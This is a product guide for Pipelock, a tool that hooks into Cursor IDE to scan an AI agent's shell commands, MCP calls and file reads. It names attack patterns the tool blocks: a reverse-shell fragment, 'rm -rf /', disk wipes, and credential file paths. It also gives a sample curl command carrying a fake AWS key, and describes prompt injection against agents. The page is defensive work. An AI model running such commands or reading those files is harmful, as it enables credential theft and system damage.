---
title: "Cursor AI Security: Scanning Hooks with Pipelock"
linkTitle: "Cursor AI Security"
subtitle: "One command to scan shell commands, MCP tool calls, and file reads before they execute."
description: "Cursor AI security guide. Install Pipelock hooks to block credential exfiltration, reverse shells, and dangerous commands before they execute."
date: 2026-03-04
lastmod: 2026-05-10
howto_steps:
  - name: Install Pipelock
    text: Install the pipelock CLI with go install or Homebrew so the Cursor integration commands are available.
  - name: Register the Cursor hooks
    text: Run pipelock cursor install to write the hook configuration into Cursor's settings.
  - name: Restart Cursor
    text: Restart Cursor so the hooks are loaded for the next agent session.
  - name: Verify protection
    text: Run pipelock verify-install to confirm the integration is wired correctly.
faq:
  - q: "What does Pipelock's Cursor integration do?"
    a: "Pipelock registers hooks with Cursor IDE that intercept shell commands, MCP tool calls, and file reads before they execute. Each action is scanned for credential leaks (65 DLP credential patterns), prompt injection, reverse shells, and dangerous operations like rm -rf or git force push. Blocked actions show a clear explanation in Cursor's UI."
  - q: "How do I install Pipelock for Cursor?"
    a: "Run 'pipelock cursor install' after installing the pipelock binary via Go (go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest) or Homebrew (brew install luckyPipewrench/tap/pipelock). The install command writes hooks.json in your Cursor config directory. Restart Cursor to activate."
  - q: "Does Pipelock work with Cursor's free plan?"
    a: "Pipelock's Cursor integration is a local CLI and adds no Pipelock subscription requirement. Plan-level availability of Cursor's hooks API is published by Cursor; check `cursor.com/docs/hooks` for the current details before relying on it."
  - q: "Does Pipelock redact secrets in Cursor's MCP tool arguments?"
    a: "Yes, in Pipelock v2.3.0 and later. When Cursor's MCP servers are wrapped through `pipelock mcp proxy` and the `redaction` section is enabled in the pipelock config, matched secrets inside `tools/call` `params.arguments` are rewritten in place with typed placeholders such as `<pl:aws-access-key:1>` before forwarding to the MCP server. Hook-side request paths (Bash and file reads) still scan and block. Redaction is request-side only in v1, so tool responses are not rewritten."
learn_cat: ide
level: intro
tags:
  - cursor
  - setup
  - dlp
---
Cursor AI security matters because the agent has shell access, can read your files, and calls MCP tools on your behalf. If the agent gets tricked by a prompt injection or a poisoned MCP server, it can exfiltrate credentials, open reverse shells, or destroy your repository.

Pipelock adds a security layer between Cursor's agent and those actions. When hooks are installed and active, shell commands, MCP tool calls, and file reads pass through Pipelock's scanning pipeline before they execute.

## Install

Install the binary:

{{< install-block "go,homebrew" >}}

Register the hooks:

```bash
pipelock cursor install
```

Restart Cursor. That's it.

The install command writes `~/.cursor/hooks.json` with three hooks: `beforeShellExecution`, `beforeMCPExecution`, and `beforeReadFile`. Each hook calls `pipelock cursor hook`, which reads the event from stdin, scans it, and returns an allow or deny decision.

## Demo

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%;">
  <iframe src="https://www.youtube-nocookie.com/embed/WVqdbGQXbY8" title="Pipelock blocks an AWS key exfil from Cursor" loading="lazy" width="560" height="315" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0;" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</div>

The agent tries to run a curl command containing a fake AWS access key. Pipelock's DLP scanner catches the credential pattern and blocks the command before it reaches the shell. Cursor shows "(Rejected)" with an explanation of what was blocked and why.

## What it blocks

**Credential exfiltration (DLP).** 65 credential patterns covering AWS keys, GitHub tokens, Anthropic/OpenAI API keys, private keys, JWTs, Google OAuth secrets, Slack tokens, financial account numbers, and more. Includes 4 checksum validators (Luhn, mod97, ABA, WIF) for structured formats. Catches secrets in shell arguments, MCP tool inputs, and file contents. Handles base64, hex, and URL encoding.

**Dangerous shell commands.** Reverse shells (`bash -i >& /dev/tcp/...`), destructive operations (`rm -rf /`), force pushes (`git push --force`), disk wipes (`dd if=/dev/zero`), and shell obfuscation techniques (variable expansion, brace expansion, encoded commands).

**Sensitive file access.** Blocks reads of `~/.ssh/id_rsa`, `~/.aws/credentials`, `.env`, `/etc/shadow`, `.netrc`, and other credential files.

**Prompt injection in MCP tools.** Scans MCP tool arguments for injection patterns and credential leaks before the tool executes.

## Cursor network egress vs hooks vs MCP proxy

Cursor security has three separate paths. Pipelock covers each path differently.

| Path | Pipelock control | Best fit |
|---|---|---|
| Cursor hooks | `pipelock cursor hook` scans shell commands, MCP hook events, and file reads before the action runs | Local guardrail for actions Cursor sends through hooks |
| Network egress | Pipelock forward proxy scans HTTP and HTTPS traffic when the agent is routed through it | Blocking credential leaks, unsafe fetches, SSRF, and arbitrary HTTP exfiltration |
| MCP proxy | `pipelock mcp proxy` wraps an MCP server and scans tool descriptions, tool arguments, and tool responses | Tool poisoning, prompt injection through tool output, and signed receipts when a signing key is configured |

Hooks are the fast install path. Network egress control is the enforcement path for outbound traffic. The MCP proxy is the content path for tool traffic. Use hooks for local action checks, then add the forward proxy or MCP proxy where the agent actually talks to the network.

Environment variables such as `HTTPS_PROXY` are enough for a smoke test, but they are not a hard boundary by themselves. Enforce network egress with container networking, host firewall rules, or a network namespace so the agent cannot skip the proxy.

## How it works

Cursor's hooks system sends a JSON event to stdin when the agent tries to execute an action:

```json
{
  "hook_event_name": "beforeShellExecution",
  "command": "curl https://httpbin.org/get?token=AKIAIOSFODNN7EXAMPLE",
  "cwd": "/home/user/project"
}
```

Pipelock evaluates the event against its scanning pipeline and responds:

```json
{
  "permission": "deny",
  "user_message": "pipelock: blocked (DLP: AWS Access Key ID)",
  "agent_message": "This action was blocked by pipelock security scanning."
}
```

Cursor displays the `user_message` to you and the `agent_message` to the AI. The agent sees the block and adjusts its approach.

## Custom config

By default, `pipelock cursor hook` uses a built-in security profile with 9 tool policy rules and all scanning features enabled. To customize:

```bash
# Generate a config file
pipelock generate config --preset cursor > ~/.config/pipelock/cursor.yaml

# Use it with the hook
pipelock cursor install --config ~/.config/pipelock/cursor.yaml
```

The [cursor preset](https://github.com/luckyPipewrench/pipelock/blob/main/configs/cursor.yaml) is a good starting point. See the [configuration reference](https://github.com/luckyPipewrench/pipelock/blob/main/docs/configuration.md) for all options.

## Verify the installation

After installing, confirm the hooks are registered:

```bash
pipelock verify-install
```

This runs 15 checks validating the scanning pipeline and network containment.

## Proof: CI gate on a signed posture capsule

Generate a signed posture capsule, then verify it against a policy. This is the CI-friendly way to gate deploys on runtime evidence:

```bash
pipelock posture emit -o .pipelock/posture
pipelock posture verify \
  --proof .pipelock/posture/proof.json \
  --key   .pipelock/posture/key.pub \
  --policy strict \
  --json
```

Output (abridged):

```json
{
  "verified": true,
  "passed": true,
  "score": 92,
  "policy": "strict",
  "policy_version": "2",
  "factor_scores": {
    "transport_ratio":        {"raw_percent": 100, "weighted": 25},
    "recorder_health":        {"raw_percent": 100, "weighted": 25},
    "simulate_pass_rate":     {"raw_percent":  96, "weighted": 24},
    "discovery_cleanliness":  {"raw_percent":  72, "weighted": 18}
  }
}
```

Exit `0` means the Ed25519 signature validated **and** every policy gate passed. Exit `1` means the capsule was unreadable. Exit `2` means the signature was valid but a gate failed. Three states, three different CI actions.

## Scan your repo first

Before starting work in a new repository, scan it for dangerous IDE config files that might have been committed by a previous contributor:

```bash
pipelock preflight .
```

This detects poisoned `.cursor/hooks.json`, `.cursor/mcp.json`, `.mcp.json`, and `.claude/settings.json` files that could override your security settings or register malicious MCP servers.

## What's new in recent releases

Cursor hooks return allow or deny decisions per tool call. Recent releases add operator-grade evidence around them:

- **`pipelock posture verify` CI gate (v2.2.0).** Verify a signed posture capsule against a named policy (`enterprise` or `strict`). Exit codes are distinct: `0` pass, `1` could not complete, `2` verified but failed. CI knows the difference between "broken" and "over-permissive".
- **RFC 9421 mediation envelope signing (v2.2.0).** If Cursor's MCP servers are also wrapped through `pipelock mcp proxy`, every proxied request carries an Ed25519 `Pipelock-Mediation` signature with a canonical policy hash. Coexists with Web Bot Auth `sig1` on the same request.
- **Mediator-signed action receipts on the MCP path (v2.2.0).** When receipt signing is configured (`flight_recorder.signing_key_path` in the pipelock config), every wrapped MCP proxy decision emits a chained Ed25519 receipt. Byte-verifiable offline with a published [Python verifier](https://github.com/luckyPipewrench/pipelock-verify-python).
- **Class-preserving redaction on `tools/call` arguments (v2.3.0).** When Cursor's MCP servers are wrapped through `pipelock mcp proxy` and the `redaction` section is enabled in the pipelock config, matched secrets inside `params.arguments` are rewritten in place with typed placeholders like `<pl:aws-access-key:1>` before forwarding. Irreversible. Fail-closed on parse errors. Tool responses are not redacted in v1.

See the [action receipt spec](/learn/action-receipt-spec/) for the receipt format and the [AI agent data redaction guide](/learn/ai-agent-data-redaction/) for redaction rollout.

<div class="hero-buttons" style="margin-top: 2rem;">
  <a href="https://github.com/luckyPipewrench/pipelock" class="btn btn-primary" data-event="github_click" data-event-placement="guide-body" target="_blank" rel="noopener noreferrer">GitHub</a>
  <a href="/install/" class="btn btn-ghost" data-event="install_click" data-event-placement="guide-body">Install Pipelock</a>
  <a href="/proof/" class="btn btn-ghost" data-event="proof_click" data-event-placement="guide-body">Inspect the proof</a>
</div>
